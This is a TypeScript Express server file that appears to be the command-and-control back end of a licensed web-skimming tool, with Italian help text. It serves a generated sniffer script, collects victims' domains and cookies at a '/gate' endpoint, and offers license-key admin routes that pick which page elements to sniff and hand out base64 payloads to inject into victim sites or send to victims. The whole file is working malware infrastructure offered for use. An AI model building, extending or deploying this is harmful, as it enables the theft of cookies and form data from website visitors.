import * as http from "http";
import * as express from "express"
import * as bodyParser from "body-parser";
import * as cors from "cors";
import * as fs from "fs";
import {Generator} from "./modules/generator";
import {Logger} from "./modules/logger";
import {Loader} from "./modules/loader";
import {Locker} from "./modules/locker";
const app = express();
export class App {
  public conf:any;
  private logger:Logger;
  public locker:Locker;
  public generator:Generator;
  public loader:Loader;
  public eccipient: any;
  public detectedIp: any;
  public salty: String;
    constructor() {
        this.locker = new Locker();
        this.logger = new Logger();
        this.generator = new Generator();
        this.loader = new Loader();
        this.loader.bannerMessage();
        this.detectedIp = this.loader.findIp();
        app.use(cors())
        app.use(bodyParser.urlencoded({
            extended: false
        }));
         app.use(bodyParser.json());
        if (process.argv[2] === '-c' && process.argv[3] === 'config.json'){
            fs.readFile('./'+process.argv[3], "utf8", (err, jsonString) => {
              if (err) throw err;
                this.conf = JSON.parse(jsonString);
                console.log('[!] Instance User:'+this.conf.instanceUser);
                console.log('[!] License Key:'+this.conf.licenseKey);
                this.locker.verify(this.conf);
                if (!this.conf.randomName){
                  this.salty="Spear";
                } else {
                  this.salty= this.loader.randomString();
                }
                this.generator.populate(JSON.parse(jsonString),this.salty);
                this.eccipient = this.generator.init();
                this.generator.endpoint();
                this.start(this.conf.port,this.detectedIp);
            });
          } else {
          this.logger.jsonError();
        }
    }
  private start(x:any,y:any): void {
        app.get('/'+this.salty,(req,res)=>{
          res.send(this.eccipient);
        });
        app.get('/'+this.conf.licenseKey+'/status',(req,res)=>{
          res.send('User: '+this.conf.instanceUser+'<br>'+
                   'Port: '+this.conf.port+'<br>'+
                   'Polling: '+this.conf.polling+'<br>'+
                   'Sniffer: '+this.detectedIp+':'+this.conf.port+'/'+this.salty+'<br>'+
                   'Victims Gate:'+this.detectedIp+':'+this.conf.port+'/gate');
          res.end();
        });
        app.get('/'+this.conf.licenseKey+'/help',(req,res)=>{
          res.send('Help Center page!'+'<br>'+
                   '/licenseKey/help  '+'Ritorna questa pagina'+'<br>'+
                   '/licenseKey/status  '+'Visualizza una panoramica dei parametri'+'<br>'+
                   '/licenseKey/restart  '+'Riavvia il server'+'<br>'+
                   '/licenseKey/common/list  '+'Visualizza una lista di tutti gli elementi di pagina impostati'+'<br>'+
                   '/licenseKey/tags/add/nometag  '+'Aggiunge un nuovo tag html sniffabile'+'<br>'+
                   '/licenseKey/ids/add/nomeid  '+'Aggiunge un nuovo id html sniffabile'+'<br>'+
                   '/licenseKey/classes/add/nomeclasse  '+'Aggiunge una nuova classe html sniffabile'+'<br>'+
                   '/licenseKey/tags/remove/nometag  '+'Rimuove un tag html precedentemente impostato'+'<br>'+
                   '/licenseKey/ids/remove/nomeid  '+'Rimuove un id html precedentemente impostato'+'<br>'+
                   '/licenseKey/classes/remove/nomeclasse  '+'Rimuove una classe html precedentemente impostata'+'<br>'+
                   '/licenseKey/polling/modify/num  '+'Modifica il tempo di comunicazione in secondi dello sniffer'+'<br>'+
                   '/licenseKey/payloads/htmlpage  '+'Ritorna in base64 il codice da inserire nel sito vittima funzionamento server-side'+'<br>'+
                   '/licenseKey/payloads/crossbrowser  '+'Ritorna in base64 il codice ed il loader da inviare alle vittime funzionamento client-side'+'<br>');
          res.end();
        });
        app.get('/'+this.conf.licenseKey+'/restart',(req,res)=>{
	           process.exit(1);
             res.end();
        });
        app.post('/gate',(req,res)=>{
          if (req.body.domain === null && req.body.cookie === null){
            this.logger.alertMessage(req);
          } else {
            this.logger.writeLogs(req.body);
          }
            res.status(200);
            res.end();
         });
        const web = http.createServer(app);
        web.listen(x,y , () => {
          console.log('[!] '+this.loader.colorStr(this.loader.color.Yellow,'Server Status ON with '+`PID: ${process.pid}`));
          console.log('[!] '+this.loader.colorStr(this.loader.color.Yellow,'Rest-API on: '+this.detectedIp+':'+this.conf.port+'/gate'));
        });
    }
}
export default new App();
